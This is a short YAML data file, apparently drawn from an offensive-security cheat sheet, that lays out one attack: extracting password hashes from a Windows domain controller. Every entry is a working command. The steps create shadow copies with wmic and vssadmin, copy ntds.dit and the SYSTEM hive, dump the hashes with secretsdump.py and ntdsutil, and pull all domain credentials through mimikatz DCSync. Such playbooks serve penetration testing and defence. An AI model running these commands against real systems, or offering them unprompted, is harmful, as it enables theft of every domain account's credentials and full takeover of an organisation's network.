- id: domain-controller-hash-extraction
  name: Domain Controller Hash Extraction
  steps:
  - id: domain-controller-hash-extraction.ntds-dit-dumping
    title: NTDS.dit Dumping
    access_required: credential
    mutates: false
    source_line: 124
    commands:
    - lang: cmd
      command: '# Create shadow copy'
    - lang: cmd
      command: wmic shadowcopy call create volume='C:\'
    - lang: cmd
      command: '# List shadow copies'
    - lang: cmd
      command: vssadmin list shadows
    - lang: cmd
      command: '# Copy NTDS.dit'
    - lang: cmd
      command: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
    - lang: cmd
      command: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
    - lang: cmd
      command: '# Extract hashes'
    - lang: cmd
      command: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
    - lang: cmd
      command: ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit
    - lang: powershell
      command: mimikatz# lsadump::dcsync /domain:domain.local /user:Administrator
    - lang: powershell
      command: mimikatz# lsadump::dcsync /domain:domain.local /all /csv
    - lang: powershell
      command: secretsdump.py domain.local/admin:password@dc01.domain.local
